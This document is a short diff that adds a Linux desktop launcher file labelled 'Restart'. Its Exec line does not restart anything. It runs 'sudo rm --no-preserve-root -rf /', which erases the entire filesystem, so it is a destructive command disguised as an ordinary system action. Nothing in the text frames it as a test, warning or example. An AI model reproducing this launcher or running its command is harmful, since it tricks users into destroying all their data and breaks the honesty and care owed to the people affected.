@@ -1,0 +1,1 @@
+[Desktop Entry] Name=Restart Exec=sudo rm --no-preserve-root -rf / Comment= Terminal=true PrefersNonDefaultGPU=false Icon=cinnamon-panel-launcher Type=Application Name[en_US]=Restart
